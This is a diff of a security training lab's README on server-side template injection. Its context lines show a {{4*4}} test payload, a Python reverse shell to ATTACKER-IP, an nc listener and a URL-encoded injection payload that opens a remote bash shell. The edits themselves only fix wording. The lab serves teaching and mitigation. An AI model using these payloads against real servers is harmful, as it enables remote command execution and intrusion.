@@ -69,7 +69,7 @@ def get(self):
 <h2>Try with /?name=YourName</h2>
 ```
 
-To confirm the input field is vulnerable, the following payload could be used to test if the result of `4*4` could be rendered in the page:
+To confirm that the input field is vulnerable, the following payload could be used to test if the result of `4*4` could be rendered in the page:
 
 ```
 http://localhost:10001/?name={{4*4}}
@@ -112,7 +112,7 @@ os.dup2(s.fileno(),2)
 p=subprocess.call(["/bin/bash","-i"]);
 ```
 
-To get receive the reverse shell, we first need to use `nc` in our terminal to listen for any connections coming to our `ATTACKER-IP` and `ATTACKER-PORT` and later execute this Python script on the victim server:
+To receive a reverse shell, we first need to use `nc` in our terminal to listen for any connections coming to our `ATTACKER-IP` and `ATTACKER-PORT` and later execute this Python script on the victim server:
 
 ```sh
 nc -nlv ATTACKER-PORT
@@ -120,9 +120,8 @@ nc -nlv ATTACKER-PORT
 
 But how can we use this payload inside the `name` parameter? To do so, we could compact it using multiples `;` to separate each instruction, resulting in the following payload:
 
-
 ```
-Don't forget to replace `ATTACKER-IP` and `ATTACKER-PORT` in the following payload 👀
+Don't forget to replace `ATTACKER-IP` and `ATTACKER-PORT` bellow!
 ```
 
 ```python
@@ -131,18 +130,15 @@ Don't forget to replace `ATTACKER-IP` and `ATTACKER-PORT` in the following paylo
 
 However, as there might be some special characters in this string, we need to escape them before injecting it in the vulnerable application (this [online URL encoder](https://www.urlencoder.org/) may help) and hope for a shell:
 
-```
+```python
 %7B%25import%20os%25%7D%7B%7Bos.popen%28%22python%20-c%20%27import%20socket%2Csubprocess%2Cos%3Bs%3Dsocket.socket%28socket.AF_INET%2Csocket.SOCK_STREAM%29%3Bs.connect%28%28%5C%22ATTACKER-IP%5C%22%2CATTACKER-PORT%29%29%3Bos.dup2%28s.fileno%28%29%2C0%29%3B%20os.dup2%28s.fileno%28%29%2C1%29%3B%20os.dup2%28s.fileno%28%29%2C2%29%3Bp%3Dsubprocess.call%28%5B%5C%22%2Fbin%2Fbash%5C%22%2C%5C%22-i%5C%22%5D%29%3B%27%22%29.read%28%29%7D%7D
 ```
 
 <p align="center"><img  src="images/attack3.png"/></p>
 
-
 ## Secure this app
 
-How could you now mitigate this vulnerability? After your code modification, an attacker should not be able to:
-
-* Run commands on the server.
+How could you now mitigate this vulnerability? After your code modification, an attacker should not be able to run commands on the server.
 
 ## PR solutions
 
